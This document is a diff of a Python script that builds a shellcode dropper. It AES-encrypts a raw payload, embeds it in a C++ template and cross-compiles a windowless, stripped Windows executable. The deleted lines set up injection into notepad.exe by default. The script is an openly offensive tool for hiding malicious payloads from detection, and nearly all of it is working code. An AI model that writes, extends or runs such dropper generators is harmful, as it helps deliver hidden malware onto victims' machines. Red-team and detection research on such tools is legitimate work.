@@ -6,6 +6,11 @@ from Crypto.Random import get_random_bytes
 import hashlib
 import os
 from colorama import Fore
+import argparse
+
+SHELLCODE_MARK = "Insert Shellcode Here"
+archs = {"1":"x64", "2":"x86"}
+
 
 def printS(text):
     print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
@@ -13,23 +18,6 @@ def printE(text):
     print(f"""{Fore.RED}[!]{Fore.WHITE} {text}""")
 def printI(text):
     print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""")
-
-defaultProcessName = r"""c:\windows\system32\notepad.exe"""
-
-if len(sys.argv) < 2:
-    print(f"Usage: {sys.argv[0]} binaryName processName(default: {defaultProcessName})")
-    sys.exit(1)
-
-binaryName = sys.argv[1]
-printI(f"Generating C++ Dropper for {binaryName}")
-
-if len(sys.argv) > 2:
-    processName = sys.argv[2]
-else:
-    processName = defaultProcessName
-    printI("No process Specified. Using default process.")
-	
-printI(f"Injecting into {processName}")
 
 def writeToFile(mark, data, i):
     # i is number of lines after mark. Starts from 0!
@@ -56,31 +44,49 @@ def encrypt(plaintext):
     cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
     ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
 
-    #key = 'char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
-    #payload = 'unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
-    
     key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
     payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
-    
+
     return key, payload
 
+def main():
 
+    parser = argparse.ArgumentParser(description="Simple raw shellcode Dropper Generator")
+    parser.add_argument("binaryName", help="File name contains raw shellcode")
+    parser.add_argument("-a", "--arch", default="1", help="Shellcode Architecture (1=x64, 2=x86) (default=x64)")
+    args = parser.parse_args()
 
-# Encrypting provided binary
-binaryData = open(binaryName, "rb").read()
-binaryKey, binaryPayload = encrypt(binaryData)
-writeToFile("Insert Shellcode Here", rf"// {binaryName}", 0)
-writeToFile("Insert Shellcode Here", f"char key[] = {binaryKey}", 1)
-writeToFile("Insert Shellcode Here", f"unsigned char payload[] = {binaryPayload}", 2)
-    
+    binaryName = args.binaryName
+    try:
+        Arch = archs[args.arch]
+    except KeyError:
+        printE("Invalid Arch...!")
+        sys.exit(1)
 
-# Encrypting provided process name
-processKey, processEncName = encrypt(processName.encode())
-writeToFile("Insert Process name here", rf"// {processName}", 0)
-writeToFile("Insert Process name here", f"char key[] = {processKey}", 1)
-writeToFile("Insert Process name here", f"unsigned char processName[] = {processEncName}", 2)
+    # Encrypting provided binary
+    try:
+        binaryData = open(binaryName, "rb").read()
+    except FileNotFoundError:
+        printE("No such file in directory!")
+        sys.exit(1)
 
+    printI(f"Generating {Arch} Dropper for {binaryName}")
 
-os.system(f"cp sources/code.cpp output/{binaryName}.cpp")
-os.system("cp sources/code.cpp.bak sources/code.cpp")
-printS(f"Output saved to output/{binaryName}.cpp")
+    binaryKey, binaryPayload = encrypt(binaryData)
+    writeToFile(SHELLCODE_MARK, rf"// {binaryName}", 0)
+    writeToFile(SHELLCODE_MARK, f"unsigned char key[] = {binaryKey}", 1)
+    writeToFile(SHELLCODE_MARK, f"unsigned char shellcode[] = {binaryPayload}", 2)
+
+    # Compiling Code
+    if Arch == "x64":
+        os.system(f"x86_64-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+    elif Arch == "x86":
+        os.system(f"i686-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
+    os.system(f"/usr/bin/cp sources/code.cpp output/{binaryName}.cpp")
+
+    os.system("/usr/bin/cp sources/code.cpp.bak sources/code.cpp")
+
+    printS(f"Executable saved to output/{binaryName}.exe")
+
+if __name__ == "__main__":
+    main()
